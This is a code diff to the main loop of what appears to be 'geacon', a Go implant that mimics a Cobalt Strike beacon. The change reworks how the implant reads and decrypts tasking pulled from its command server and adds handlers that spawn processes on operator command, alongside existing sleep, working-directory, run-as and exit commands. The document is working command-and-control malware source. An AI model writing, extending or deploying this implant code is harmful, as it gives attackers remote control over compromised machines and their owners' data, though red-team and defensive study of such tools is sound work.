@@ -8,6 +8,7 @@ import (
 	"geacon/cmd/packet"
 	"geacon/cmd/util"
 	"io"
+	"io/ioutil"
 	"os"
 	"strings"
 	"time"
@@ -22,14 +23,14 @@ func main() {
 			chainedResults := packet.CheckTcpBeacons()
 			fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
 			resp := packet.PullCommand()
-			fmt.Printf("%x\n", resp.Bytes())
-			fmt.Printf("%d \n", resp.Response().ContentLength)
+			body, _ := ioutil.ReadAll(resp.Body)
+			fmt.Printf("%x\n", body)
+			fmt.Printf("%d \n", resp.ContentLength)
 			if resp != nil {
-				totalLen := len(resp.Bytes())
+				totalLen := len(body)
 				if totalLen > 0 {
-					
 
-					decrypted, hmacVerfied := packet.DecryptPacket(resp.Bytes())
+					decrypted, hmacVerfied := packet.DecryptPacket(body)
 
 					if decrypted != nil {
 						if hmacVerfied {
@@ -142,7 +143,7 @@ func main() {
 									case packet.CMD_TYPE_SLEEP:
 										sleep := packet.ReadInt(cmdBuf[:4])
 										//jitter := packet.ReadInt(cmdBuf[4:8])
-										fmt.Printf("Now sleep is %d ms\n",sleep)
+										fmt.Printf("Now sleep is %d ms\n", sleep)
 										config.WaitTime = time.Duration(sleep) * time.Millisecond
 									case packet.CMD_TYPE_PWD:
 										pwdResult := packet.GetCurrentDirectory()
@@ -185,6 +186,12 @@ func main() {
 										result := packet.ParseRunAs(cmdBuf)
 										finalPacket := packet.MakePacket(0, result)
 										resultBuf = append(resultBuf, finalPacket...)
+									case packet.CMD_TYPE_SPAWN:
+										packet.Spawn("x86", cmdBuf)
+									case packet.CMD_TYPE_SPAWN_64:
+										packet.Spawn("x64", cmdBuf)
+									case packet.CMD_TYPE_SPAWNAS_64:
+										packet.SpawnAs("x64", cmdBuf)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
